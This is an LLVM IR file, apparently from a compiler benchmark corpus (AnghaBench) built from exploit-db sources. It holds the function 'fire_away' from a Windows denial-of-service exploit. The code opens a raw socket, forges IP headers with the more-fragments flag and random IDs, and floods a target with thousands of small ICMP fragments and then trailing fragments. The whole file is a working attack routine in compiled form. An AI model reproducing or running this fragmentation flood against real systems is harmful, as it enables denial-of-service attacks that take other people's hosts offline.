; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24634.c_fire_away.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24634.c_fire_away.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i64, i8*, i8*, i32, i32, i8* }
%struct.igmphdr = type { i32 }
%struct.icmphdr = type { i32, %struct.TYPE_6__, i64, i32 }
%struct.TYPE_6__ = type { %struct.TYPE_5__ }
%struct.TYPE_5__ = type { i32, i32 }
%struct.utsname = type { i32 }
%struct.passwd = type { i32 }
%struct.sockaddr = type { i32 }

@NUM_PACKETS = common dso_local global i32 0, align 4
@IP_MF = common dso_local global i64 0, align 8
@ICMP_ECHO = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"error: socket()\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c" Sending out series of small fragments\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"error: sendto()\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c" Sending out tailing fragments\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @fire_away(%struct.sockaddr_in* %0, i64 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.iphdr*, align 8
  %9 = alloca %struct.igmphdr*, align 8
  %10 = alloca %struct.icmphdr*, align 8
  %11 = alloca %struct.utsname*, align 8
  %12 = alloca %struct.passwd*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store %struct.sockaddr_in* %0, %struct.sockaddr_in** %4, align 8
  store i64 %1, i64* %5, align 8
  store i32 1, i32* %6, align 4
  %20 = load i32, i32* @NUM_PACKETS, align 4
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %13, align 8
  %23 = alloca i32, i64 %21, align 16
  store i64 %21, i64* %14, align 8
  %24 = call i32 (...) @random()
  %25 = srem i32 %24, 40000
  %26 = add nsw i32 %25, 500
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %16, align 4
  br label %27

27:                                               ; preds = %38, %2
  %28 = load i32, i32* %16, align 4
  %29 = load i32, i32* @NUM_PACKETS, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %41

31:                                               ; preds = %27
  %32 = call i32 (...) @random()
  %33 = srem i32 %32, 40000
  %34 = add nsw i32 %33, 500
  %35 = load i32, i32* %16, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %23, i64 %36
  store i32 %34, i32* %37, align 4
  br label %38

38:                                               ; preds = %31
  %39 = load i32, i32* %16, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %16, align 4
  br label %27

41:                                               ; preds = %27
  %42 = load i32, i32* %6, align 4
  %43 = sext i32 %42 to i64
  %44 = add i64 %43, 56
  %45 = add i64 %44, 32
  %46 = trunc i64 %45 to i32
  %47 = call i64 @calloc(i32 1, i32 %46)
  %48 = inttoptr i64 %47 to i8*
  store i8* %48, i8** %7, align 8
  %49 = load i8*, i8** %7, align 8
  %50 = bitcast i8* %49 to %struct.iphdr*
  store %struct.iphdr* %50, %struct.iphdr** %8, align 8
  %51 = load i8*, i8** %7, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 56
  %53 = bitcast i8* %52 to %struct.icmphdr*
  store %struct.icmphdr* %53, %struct.icmphdr** %10, align 8
  %54 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 0
  store i32 4, i32* %55, align 8
  %56 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %56, i32 0, i32 1
  store i32 14, i32* %57, align 4
  %58 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 2
  store i32 255, i32* %59, align 8
  %60 = load i32, i32* %6, align 4
  %61 = call i8* @htons(i32 %60)
  %62 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 9
  store i8* %61, i8** %63, align 8
  %64 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 3
  store i32 1, i32* %65, align 4
  %66 = load i32, i32* %18, align 4
  %67 = call i8* @htons(i32 %66)
  %68 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 6
  store i8* %67, i8** %69, align 8
  %70 = load i64, i64* @IP_MF, align 8
  %71 = trunc i64 %70 to i32
  %72 = call i8* @htons(i32 %71)
  %73 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 5
  store i8* %72, i8** %74, align 8
  %75 = load i64, i64* %5, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 4
  store i64 %75, i64* %77, align 8
  %78 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %83 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %82, i32 0, i32 8
  store i32 %81, i32* %83, align 4
  %84 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %85 = bitcast %struct.iphdr* %84 to i16*
  %86 = call i32 @in_cksum(i16* %85, i32 56)
  %87 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %88 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %87, i32 0, i32 7
  store i32 %86, i32* %88, align 8
  %89 = load i32, i32* @ICMP_ECHO, align 4
  %90 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %91 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %90, i32 0, i32 3
  store i32 %89, i32* %91, align 8
  %92 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %93 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %92, i32 0, i32 2
  store i64 0, i64* %93, align 8
  %94 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %95 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %94, i32 0, i32 0
  store i32 1000, i32* %95, align 8
  %96 = call i32 (...) @random()
  %97 = srem i32 %96, 255
  %98 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %99 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %98, i32 0, i32 1
  %100 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %99, i32 0, i32 0
  %101 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %100, i32 0, i32 0
  store i32 %97, i32* %101, align 4
  %102 = call i32 (...) @random()
  %103 = srem i32 %102, 255
  %104 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %105 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %104, i32 0, i32 1
  %106 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %105, i32 0, i32 0
  %107 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  store i32 89, i32* %16, align 4
  br label %108

108:                                              ; preds = %120, %41
  %109 = load i32, i32* %16, align 4
  %110 = load i32, i32* %6, align 4
  %111 = icmp slt i32 %109, %110
  br i1 %111, label %112, label %123

112:                                              ; preds = %108
  %113 = call i32 (...) @random()
  %114 = srem i32 %113, 255
  %115 = trunc i32 %114 to i8
  %116 = load i8*, i8** %7, align 8
  %117 = load i32, i32* %16, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  store i8 %115, i8* %119, align 1
  br label %120

120:                                              ; preds = %112
  %121 = load i32, i32* %16, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %16, align 4
  br label %108

123:                                              ; preds = %108
  %124 = load i32, i32* @AF_INET, align 4
  %125 = load i32, i32* @SOCK_RAW, align 4
  %126 = load i32, i32* @IPPROTO_RAW, align 4
  %127 = call i32 @socket(i32 %124, i32 %125, i32 %126)
  store i32 %127, i32* %17, align 4
  %128 = icmp slt i32 %127, 0
  br i1 %128, label %129, label %131

129:                                              ; preds = %123
  %130 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %19, align 4
  br label %228

131:                                              ; preds = %123
  %132 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %16, align 4
  br label %133

133:                                              ; preds = %176, %131
  %134 = load i32, i32* %16, align 4
  %135 = load i32, i32* @NUM_PACKETS, align 4
  %136 = icmp slt i32 %134, %135
  br i1 %136, label %137, label %179

137:                                              ; preds = %133
  %138 = load i32, i32* %16, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i32, i32* %23, i64 %139
  %141 = load i32, i32* %140, align 4
  %142 = call i8* @htons(i32 %141)
  %143 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 6
  store i8* %142, i8** %144, align 8
  store i64 0, i64* %15, align 8
  br label %145

145:                                              ; preds = %169, %137
  %146 = load i64, i64* %15, align 8
  %147 = icmp ult i64 %146, 8170
  br i1 %147, label %148, label %175

148:                                              ; preds = %145
  %149 = load i64, i64* %15, align 8
  %150 = load i64, i64* @IP_MF, align 8
  %151 = or i64 %149, %150
  %152 = trunc i64 %151 to i32
  %153 = call i8* @htons(i32 %152)
  %154 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 5
  store i8* %153, i8** %155, align 8
  %156 = load i32, i32* %17, align 4
  %157 = load i8*, i8** %7, align 8
  %158 = load i32, i32* %6, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 %159, 56
  %161 = trunc i64 %160 to i32
  %162 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  %164 = call i32 @sendto(i32 %156, i8* %157, i32 %161, i32 0, %struct.sockaddr* %163, i32 4)
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %166, label %168

166:                                              ; preds = %148
  %167 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %19, align 4
  br label %228

168:                                              ; preds = %148
  br label %169

169:                                              ; preds = %168
  %170 = load i32, i32* %6, align 4
  %171 = add nsw i32 %170, 1
  %172 = sext i32 %171 to i64
  %173 = load i64, i64* %15, align 8
  %174 = add i64 %173, %172
  store i64 %174, i64* %15, align 8
  br label %145

175:                                              ; preds = %145
  br label %176

176:                                              ; preds = %175
  %177 = load i32, i32* %16, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %16, align 4
  br label %133

179:                                              ; preds = %133
  %180 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  store i64 0, i64* %15, align 8
  br label %181

181:                                              ; preds = %220, %179
  %182 = load i64, i64* %15, align 8
  %183 = load i32, i32* @NUM_PACKETS, align 4
  %184 = mul nsw i32 9999, %183
  %185 = sext i32 %184 to i64
  %186 = icmp ult i64 %182, %185
  br i1 %186, label %187, label %223

187:                                              ; preds = %181
  store i32 0, i32* %16, align 4
  br label %188

188:                                              ; preds = %215, %187
  %189 = load i32, i32* %16, align 4
  %190 = load i32, i32* @NUM_PACKETS, align 4
  %191 = icmp slt i32 %189, %190
  br i1 %191, label %192, label %218

192:                                              ; preds = %188
  %193 = load i32, i32* %16, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i32, i32* %23, i64 %194
  %196 = load i32, i32* %195, align 4
  %197 = call i8* @htons(i32 %196)
  %198 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 6
  store i8* %197, i8** %199, align 8
  %200 = load i64, i64* @IP_MF, align 8
  %201 = or i64 8190, %200
  %202 = trunc i64 %201 to i32
  %203 = call i8* @htons(i32 %202)
  %204 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 5
  store i8* %203, i8** %205, align 8
  %206 = load i32, i32* %17, align 4
  %207 = load i8*, i8** %7, align 8
  %208 = load i32, i32* %6, align 4
  %209 = sext i32 %208 to i64
  %210 = add i64 56, %209
  %211 = trunc i64 %210 to i32
  %212 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %213 = bitcast %struct.sockaddr_in* %212 to %struct.sockaddr*
  %214 = call i32 @sendto(i32 %206, i8* %207, i32 %211, i32 0, %struct.sockaddr* %213, i32 4)
  br label %215

215:                                              ; preds = %192
  %216 = load i32, i32* %16, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %16, align 4
  br label %188

218:                                              ; preds = %188
  %219 = call i32 @usleep(i32 100)
  br label %220

220:                                              ; preds = %218
  %221 = load i64, i64* %15, align 8
  %222 = add i64 %221, 1
  store i64 %222, i64* %15, align 8
  br label %181

223:                                              ; preds = %181
  %224 = load i8*, i8** %7, align 8
  %225 = call i32 @free(i8* %224)
  %226 = load i32, i32* %17, align 4
  %227 = call i32 @close(i32 %226)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %19, align 4
  br label %228

228:                                              ; preds = %223, %166, %129
  %229 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %229)
  %230 = load i32, i32* %3, align 4
  ret i32 %230
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @random(...) #2

declare dso_local i64 @calloc(i32, i32) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @in_cksum(i16*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
